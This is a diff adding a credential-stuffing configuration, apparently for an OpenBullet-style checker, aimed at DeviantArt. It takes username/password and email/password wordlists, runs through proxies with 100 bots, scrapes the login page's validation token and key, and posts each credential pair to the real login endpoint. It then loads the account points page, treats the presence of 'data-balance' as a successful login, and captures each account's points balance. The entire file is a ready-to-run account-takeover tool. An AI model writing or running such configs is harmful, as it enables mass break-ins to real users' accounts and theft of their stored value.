@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "DeviantArt(Capture)",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-14T06:21:20.9689534+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Login REQUEST GET "https://www.deviantart.com/users/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.deviantart.com" 
+  HEADER "referer: https://www.deviantart.com/" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=validate_token]" "value" 0 -> VAR "TOKEN" "" "" 
+#PARSE_KEY PARSE "<SOURCE>" CSS "[name=validate_key]" "value" 0 -> VAR "KEY" "" "" 
+#Login_POST REQUEST POST "https://www.deviantart.com/users/login" AutoRedirect=TRUE 
+  CONTENT "challenge=&username=<USER>&password=<PASS>&validate_token=<TOKEN>&validate_key=<KEY>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.deviantart.com" 
+  HEADER "referer: https://www.deviantart.com/" 
+#REQUEST_POINTS REQUEST GET "https://www.deviantart.com/account/points/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.deviantart.com/" 
+#KEY_CHECK_login KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "data-balance" 
+  KEYCHAIN Success OR 
+    KEY "data-balance" 
+#PARSE_Capture PARSE "<SOURCE>" CSS "div#points div.pointsbar > div > div > div > span" "data-balance" 0 -> CAP "POINTS" "" "" 
